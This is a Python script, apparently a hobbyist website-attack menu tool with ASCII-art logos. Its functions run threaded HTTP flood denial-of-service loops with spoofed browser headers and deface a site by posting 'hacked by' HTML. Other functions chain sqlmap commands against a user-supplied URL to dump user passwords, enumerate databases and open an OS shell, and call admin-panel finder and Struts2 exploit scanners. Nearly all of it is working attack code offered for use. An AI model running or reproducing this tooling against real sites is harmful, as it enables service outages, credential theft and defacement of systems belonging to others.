import os
import sys
import threading
import requests

current_file_path = os.path.dirname(os.path.abspath(__file__))
tools_folder = current_file_path
logo = """
   ▄████████ 
  ███    ███ 
  ███    █▀  
  ███        +-------------------+
▀███████████ |                ┓  |
         ███ |┏┓┓┏╋┏┓  ┏┓╋╋┏┓┏┃┏ |
   ▄█    ███ |┗┻┗┻┗┗┛  ┗┻┗┗┗┻┗┛┗ |
 ▄████████▀  +-------------------+
             
"""
logo2 = """                                                                      
                                                  '
                                               '//'
                                     ___  '__'///'  .
                                  \ /   \I/ /////'       .              \/
                                  \ "       ==%//='          . ____ \\/\  /\//
                                   = >    %%%%====%=-'        |''''\  ka-     /
                                  / "    ##%%%==\\'           |    /     BOOM \
                                  /  \ ____ =\\%\\'          . ~~~~ //\/  \/\\
                                           ~ '\\\'       .              /\
                                               '\\' .
                                                 ''DdC
"""
logo3 = """

              _________
            /'        /|
           /         / |_
          /         /  //|
         /_________/  ////|
        |   _ _    | 8o////|
        | /'// )_  |   8///|
        |/ // // ) |   8o///|
        / // // //,|  /  8//|
       / // // /// | /   8//|
      / // // ///__|/    8//|
     /.(_)// /// |       8///|
    (_)' `(_)//| |       8////|___________
   (_) /_\ (_)'| |        8///////////////
   (_) \"/ (_)'|_|         8/////////////
    (_)._.(_) d' Hb         8oooooooopb'
      `(_)'  d'  H`b
            d'   `b`b
           d'     H `b
          d'      `b `b
         d'           `b
        d'             `b

   

"""
list="""
                                            +------------------------+
                                            |1.DDOS ATTACK           |
                                            |2.SQLMAP                |
                                            |3.ADMIN FINDER          |
                                            |4.WEB SCAN              |
                                            +------------------------+
"""
def admin(url):
    os.system("./ shiter_admin-finder -u {}".format(url))

def cpscan(url):
    os.system("./ cpscan.py -t {} -v".format(url))

def ddos(url):
    def dos(target):
        while True:
            try:
                res = requests.get(target)
                print("Request sent!")
            except requests.exceptions.ConnectionError:
                print("[!!!] " + "Connection error!")

    threads = 20
    try:
        threads = int(input("Threads: "))
    except ValueError:
        sys.exit("Threads count is incorrect!")

    if threads == 0:
        sys.exit("Threads count is incorrect!")

    if not url.startswith("http"):
        sys.exit("URL doesn't start with http or https!")

    if not url.__contains__("."):
        sys.exit("Invalid domain!")

    for i in range(0, threads):
        thr = threading.Thread(target=dos, args=(url,))
        thr.start()
    print(str(i + 1) + " threads started!")

def s2s(url):
    os.system(" python hack_Struts2Scan -u {}".format(url))
    os.system(" python hack_Struts2Scan -u{} --webpath".format(url))
    os.system(" python hack_Struts2Scan -u{} -f".format(url))
    os.system(" python hack_Struts2Scan -u {} -e".format(url))

def sqlmap(url):
    os.system("python sqlmap.py -u {}".format(url))
    os.system("python sqlmap.py -d {}".format(url))
    os.system("python sqlmap.py -u {} -proxy http://localhost:8080".format(url))
    os.system("python sqlmap.py -u {} --random-agent".format(url))
    os.system("""python sqlmap.py -u {} -p "id" --random-agent -technique=T -level 2 -v 3""".format(url))
    os.system("python sqlmap.py -u {} --random-agent --current-user".format(url))
    os.system("python sqlmap.py -u {} --random-agent --users --password".format(url))
    os.system("python sqlmap.py -u {} --random-agent --dbs".format(url))
    os.system("""python sqlmap.py -u {} --random-agent -D "test" --tables""".format(url))
    os.system("""python sqlmap.py -u {} --random-agent -D "test" -T "users" --columns""".format(url))
    os.system("""python sqlmap.py -u {} --random-agent -D "test" -T "users" -C "ID,password" --dump""".format(url))
    os.system("""python sqlmap.py -u {} --random-agent -D "test" -T "users" -C "ID,password" --dump""".format(url))
    os.system("python sqlmap.py -u {} --random-agent --os-shell".format(url))
    os.system("python sqlmap.py -u {} --risk 3 --level 5 --dump --flush-session --disable-coloring".format(url))
import requests

def attack_website(url):
    # 设置请求头，伪装成正常的浏览器请求
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0;Win64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
        'Referer': 'https://www.google.com',
        'Cookie': 'evil_cookie=1'
    }

    # 发起恶意请求，对目标网站进行拒绝服务攻击
    while True:
        try:
            response = requests.get(url, headers=headers)
            print(f"Attacking {url}...")
        except requests.exceptions.RequestException:
            # 当请求出错时，继续攻击
            continue



    
import requests

def tamper_website(url, content):
    # 设置请求头，伪装成合法的浏览器请求
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0;Win64) AppleWebkit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36',
        'Referer': 'https://www.google.com',
        'Cookie': 'evil_cookie=1'
    }

    # 发起恶意请求，篡改目标网站的内容
    try:
        response = requests.get(url, headers=headers)
        if response.status_code == 200:
            # 替换目标网站的内容为你想要的内容
            tampered_content = content
            response = requests.post(url, headers=headers, data=tampered_content)
            print(f"Website {url} tampered successfully!")
    except requests.exceptions.RequestException:
        # 当请求出错时，继续攻击
        pass   
tampered_content = "<h1>This website has been hacked by the Evil Tamperer!</h1>"
def run():
    os.system("cls")
    os.system("clear")
    print(logo3)
    url = input("url>>>")
    os.system("cls")
    os.system("clear")
    print(logo2)
    print(list)
    mood = input("input the tool you would like to use> ")
    
    
    if 'sqlmap' in mood.lower():
        sqlmap(url)
    elif 'admin finder' in mood.lower():
        admin(url)
    elif 'scan' in mood.lower():
        cpscan(url)
        s2s(url)

    elif 'ddos' in mood.lower():
        attack_website(url)

print(logo)
os.chdir(tools_folder)
i = input("press Enter to start>> ")
if i.lower() == 'start':
    run()
else:
    run()
